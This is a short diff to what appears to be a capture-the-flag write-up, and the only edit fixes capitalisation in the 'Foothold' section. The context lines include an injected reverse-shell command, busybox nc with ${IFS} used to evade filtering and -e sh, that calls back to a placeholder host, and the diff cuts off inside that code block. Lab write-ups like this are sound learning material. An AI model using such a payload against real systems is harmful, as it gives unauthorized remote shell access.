@@ -135,7 +135,7 @@ Lets crack the password hash.
 ## Foothold
 
 And now we can login.
-But I was wondering if we can execute command,can i get shell from that.
+But I was wondering if we can execute command,Can I get shell from that.
 I tried different things but this one worked.
 ```bash
 busybox${IFS}nc${IFS}ip${IFS}9999${IFS}-e${IFS}sh;
